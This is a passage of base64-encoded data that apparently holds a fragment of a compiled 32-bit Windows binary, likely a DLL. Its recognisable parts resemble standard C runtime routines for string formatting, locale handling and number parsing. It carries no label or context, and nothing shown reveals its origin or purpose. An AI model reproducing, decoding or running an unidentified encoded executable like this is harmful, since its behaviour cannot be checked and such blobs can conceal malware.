rP3//4TbD4l8/v//BFHGhdT9//8wiIXV/f//x4XM/f//AgAAAOle/v//g8cEM/aJveT9///2wyB0EfbDQHQGD79H/OsOD7dH/OsI9sNAdAqLR/yZi8iL+usFi0/8i/72w0B0HDv+fxh8BDvOcxL32RP+99+BywABAACJnej9///3wwCQAAB1Aov+i5Xc/f//hdJ5BTPSQusUg+P3uAACAACJnej9//870H4Ci9CLwQvHdQaJtcz9//+NdfOLwkqJldz9//+FwH8Gi8ELx3Q9i4XY/f//mVJQV1HoqQgAAIPBMImdjP3//4mFxP3//4v6g/k5fgYDjaz9//+Lldz9//+IDk6LjcT9///rsIud6P3//41F8yvGRomF2P3///fDAAIAAHQ2hcB0BYA+MHQtTv+F2P3//8YGMOshhfZ1Bos1cHEBEIvG6wdJgDgAdAVAhcl19SvGiYXY/f//g724/f//AA+FhgEAAPbDQHQ198MAAQAAdAnGhdT9//8t6xr2wwF0CcaF1P3//yvrDPbDAnQRxoXU/f//IMeFzP3//wEAAACLvcD9//8rvdj9//+Lhcz9//8r+PbDDHUejYXg/f//UP+10P3//1dqIOgSAgAAi4XM/f//g8QQ/7Wk/f//jY3g/f//Uf+10P3//1CNhdT9//9Q6BUCAACDxBT2wwh0HfbDBHUYjYXg/f//UP+10P3//1dqMOjHAQAAg8QQg728/f//AIuF2P3//3R9hcB+eYvOSImFxP3//w+3AYPBAlBqBo1F9ImNjP3//1CNhaD9//9Q6AsHAACDxBCFwHU/OYWg/f//dDf/taT9//+NheD9//9Q/7XQ/f//jUX0/7Wg/f//UOiEAQAAi4XE/f//g8QUi42M/f//hcB1lusog8n/iY3g/f//6yP/taT9//+NjeD9//9R/7XQ/f//UFboSgEAAIPEFIuN4P3//4XJeCP2wwR0Ho2F4P3//1D/tdD9//9XaiDo9wAAAIPEEIuN4P3//4uFqP3//4XAdBVQ6MaY//8zwFmJhaj9//+LjeD9//+LhfD9//+KEIiV7/3//4iVtP3//4TSD4UM9v//i4XI/f//hcB0GoP4B3QV6Fin///HABYAAADoyKP//4PI/+sCi8GAvZz9//8AX15bdAqLjZj9//+DYXD9i038M83oAnb//4vlXcOQxKUAEMyjABAA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Bch+ARB0B1Dolnj//1mLRkQ7Bcx+ARB0B1DohHj//1mLRkg7BdB+ARB0B1Docnj//1mLRkw7BdR+ARB0B1DoYHj//1leXcNVi+xWi3UIhfZ0WYsGOwWIfgEQdAdQ6EF4//9Zi0YEOwWMfgEQdAdQ6C94//9Zi0YIOwWQfgEQdAdQ6B14//9Zi0YwOwW4fgEQdAdQ6At4//9Zi0Y0OwW8fgEQdAdQ6Pl3//9ZXl3DVYvsVot1CIX2D4RuAwAA/3YE6N53////dgjo1nf///92DOjOd////3YQ6MZ3////dhTovnf///92GOi2d////zbor3f///92IOind////3Yk6J93////dijol3f///92LOiPd////3Yw6Id3////djTof3f///92HOh3d////3Y46G93////djzoZ3f//4PEQP92QOhcd////3ZE6FR3////dkjoTHf///92TOhEd////3ZQ6Dx3////dlToNHf///92WOgsd////3Zc6CR3////dmDoHHf///92ZOgUd////3Zo6Ax3////dmzoBHf///92cOj8dv///3Z06PR2////dnjo7Hb///92fOjkdv//g8RA/7aAAAAA6NZ2////toQAAADoy3b///+2iAAAAOjAdv///7aMAAAA6LV2////tpAAAADoqnb///+2lAAAAOifdv///7aYAAAA6JR2////tpwAAADoiXb///+2oAAAAOh+dv///7akAAAA6HN2////tqgAAADoaHb///+2uAAAAOhddv///7a8AAAA6FJ2////tsAAAADoR3b///+2xAAAAOg8dv///7bIAAAA6DF2//+DxED/tswAAADoI3b///+2tAAAAOgYdv///7bUAAAA6A12////ttgAAADoAnb///+23AAAAOj3df///7bgAAAA6Ox1////tuQAAADo4XX///+26AAAAOjWdf///7bQAAAA6Mt1////tuwAAADowHX///+28AAAAOi1df///7b0AAAA6Kp1////tvgAAADon3X///+2/AAAAOiUdf///7YAAQAA6Il1////tgQBAADofnX//4PEQP+2CAEAAOhwdf///7YMAQAA6GV1////thABAADoWnX///+2FAEAAOhPdf///7YYAQAA6ER1////thwBAADoOXX///+2IAEAAOgudf///7YkAQAA6CN1////tigBAADoGHX///+2LAEAAOgNdf///7YwAQAA6AJ1////tjQBAADo93T///+2OAEAAOjsdP///7Y8AQAA6OF0////tkABAADo1nT///+2RAEAAOjLdP//g8RA/7ZIAQAA6L10////tkwBAADosnT///+2UAEAAOindP///7ZUAQAA6Jx0////tlgBAADokXT///+2XAEAAOiGdP///7ZgAQAA6Ht0//+DxBxeXcNVi+yD7BiNTehT/3UQ6HiC//+LXQiNQwE9AAEAAHcPi0Xoi4CQAAAAD7cEWOtui8ONTejB+AiJRQhRD7bAUOhI4P//WVmFwHQSi0UIagKIRfiIXfnGRfoAWesKM8mIXfjGRfkAQYtF6GoB/3AEjUX8UFGNRfhQjUXoagFQ6P3y//+DxByFwHUQOEX0dAeLRfCDYHD9M8DrFA+3RfwjRQyAffQAdAeLTfCDYXD9W4vlXcNqCGiAYQEQ6FVx//++sH0BEDk1rH0BEHQqagzot6z//1mDZfwAVmisfQEQ6F/f//9ZWaOsfQEQx0X8/v///+gGAAAA6F5x///Dagzo8a3//1nDVYvsg+xEoQhwARAzxYlF/ItNCFNWVw+3QQoz24t9DIvQJQCAAACJfcCJRbyB4v9/AACLQQaB6v8/AACJRfCLQQKJRfQPtwHB4BCJVeCJRfiB+gHA//91JYvzi8M5XIXwdQtAg/gDfPTpuQQAADPAjX3wq6uragJb6aYEAACh8H4BEI118I195IlV3KVIiUXMah+JXdSljUgBi8GZpV4j1gPQwfoFiVXEgeEfAACAeQVJg8ngQSvxM8BAiXXQi86Dz//T4GoDXoVElfAPhKQAAACLx9Pg99CFRJXw6wQ5XJXwdQpCO9Z89emFAAAAi0XMmWofWSPRA9CLRczB+gUlHwAAgHkFSIPI4EAryIld1DPAQNPgiUXIi0SV8ItNyAPIiU3YO8iLRdiLy2r/X3IFO0XIcwYzyUGJTdSJRJXwSnguhcl0J4tElfCLy4ld1I14ATv4iX3Yi8dyBYP4AXMGM8lBiU3UiUSV8Ep51YPP/4tN0ItVxIvH0+AhRJXwjUIBO8Z9EY198IvOjTyHK8gzwPOrg8//i03gOV3UdAFBixXsfgEQi8IrBfB+ARA7yH0PM8CNffCrq6uL8+m2/v//O8oPjxkCAAArVdyNdeSJVdCNffCLwqWZg+IfA8LB+AWliUXEi0XQpSUfAACAeQVIg8jgQIlF0IPP/4vHiV3gi33Qi8/T4PfQaiCJRdhYK8dqA4lFyF6LVJ3wi8+LwtPqC1XgI0XYi03I0+CJVJ3wQ4lF4DvefN+LRcSNVfjB4AIz22oCK9CDz/+LRcRZO8h8C4sCiUSN8ItFxOsEiVyN8IPqBEl554tNzEGLwZmD4h8D0MH6BYlV1IHhHwAAgHkFSYPJ4EFqH1grwYlF0DPAi03QQNPghUSV8A+EkgAAAIvH0+D30IVElfDrBDlclfB1B0I71nz163aLfcyLx2ofmVkj0QPQwfoFgecfAACAeQVPg8/gR4tElfArzzP/R9Pni8uJfdwD+Il94Dv4i0Xgav9fcgU7RdxzAzPJQYlElfBKeCiFyXQhi0SV8IvLjXgBO/iJfeCLx3IFg/gBcwMzyUGJRJXwSnnbg8//i03Qi1XUi8fT4CFElfBCO9Z9EY198IvOjTyXK8ozwPOrg8//iw30fgEQQYvBmYPiHwPCwfgFiUXYgeEfAACAeQVJg8ngQYlN3IvD0+dqIIld4PfXi13cWSvLiUXMiU3ci1SF8IvLi8LT6otNzCPHC1XgiVSN8ItN3NPgiUXgi0XMQIlFzDvGfNeLddiNVfiLxsHgAmoCK9Az21k7znwIiwKJRI3w6wSJXI3wg+oESXnq6dj9//87Deh+ARAPjKIAAACLDfR+ARCNffAzwKurq4vBgU3wAAAAgJmD4h8DwsH4BYlFzIHhHwAAgHkFSYPJ4EGDz/+JTchqINPnWCvBiV3g99eJRdiLVJ3wi8LT6iPHC1Xgi03Y0+CLTciJVJ3wQ4lF4DvefN+LdcyNVfiLxsHgAmoCK9Az21k7znwIiwKJRI3w6wSJXI3wg+oESXnqizX8fgEQM9sDNeh+ARBD6ZUAAACLNfx+ARCBZfD///9/A/GLDfR+ARCLwZmD4h+JdcgDwsH4BYlF2IHhHwAAgHkFSYPJ4EFqIIld4Ivz0+eL2Vgrw4lN3PfXiUXci1S18IvLi8LT6gtV4CPHi03c0+CJVLXwRolF4IP+A3zfi33YjVX4i3XIi8fB4AJqAivQM9tZO898CIsCiUSN8OsEiVyN8IPqBEl56ot9wGofWCsF9H4BEIvIi0W80+b32BvAJQAAAIAL8KH4fgEQC3Xwg/hAdQqLRfSJdwSJB+sHg/ggdQKJN4tN/IvDX14zzVvosUv//4vlXcNVi+yD7EShCHABEDPFiUX8i00IU1ZXD7dBCjPbi30Mi9AlAIAAAIl9wIlFvIHi/38AAItBBoHq/z8AAIlF8ItBAolF9A+3AcHgEIlV4IlF+IH6AcD//3Uli/OLwzlchfB1C0CD+AN89Om5BAAAM8CNffCrq6tqAlvppgQAAKEIfwEQjXXwjX3kiVXcpUiJRcxqH4ld1KWNSAGLwZmlXiPWA9DB+gWJVcSB4R8AAIB5BUmDyeBBK/EzwECJddCLzoPP/9PgagNehUSV8A+EpAAAAIvH0+D30IVElfDrBDlclfB1CkI71nz16YUAAACLRcyZah9ZI9ED0ItFzMH6BSUfAACAeQVIg8jgQCvIiV3UM8BA0+CJRciLRJXwi03IA8iJTdg7yItF2IvLav9fcgU7RchzBjPJQYlN1IlElfBKeC6FyXQni0SV8IvLiV3UjXgBO/iJfdiLx3IFg/gBcwYzyUGJTdSJRJ